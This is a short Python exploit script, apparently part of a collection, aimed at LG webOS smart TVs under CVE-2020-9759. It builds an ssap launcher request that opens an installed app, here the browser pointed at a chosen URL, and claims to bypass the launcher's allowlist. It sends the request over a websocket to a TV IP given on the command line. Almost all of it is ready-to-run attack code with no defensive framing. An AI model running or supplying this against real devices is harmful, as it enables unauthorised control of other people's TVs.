#!/usr/bin/env python3
"""CVE-2020-9759 — LG webOS WebAppLauncher. Launch an arbitrary installed app
by id over the Luna/ssap channel, bypassing the launcher's allowlist."""
import json, sys

def build() -> bytes:
    return json.dumps({"id": "launch", "type": "request",
                       "uri": "ssap://system.launcher/launch",
                       "payload": {"id": "com.webos.app.browser",
                                   "params": {"target": "http://192.168.1.1/"}}}).encode()

def exploit(host, port=3000):
    sys.path.insert(0, str(__import__("pathlib").Path(__file__).parent))
    from cve_2024_25065_webos_lunabus import _ws_connect, _ws_send
    s = _ws_connect(host, port); _ws_send(s, build())
    r = s.recv(4096); s.close()
    print(f"[+] CVE-2020-9759 launch sent to {host}"); return True

def main():
    if len(sys.argv) > 1: exploit(sys.argv[1])
    else: print("usage: cve_2020_9759_lg_webapplauncher.py <tv-ip>")

if __name__ == "__main__":
    main()
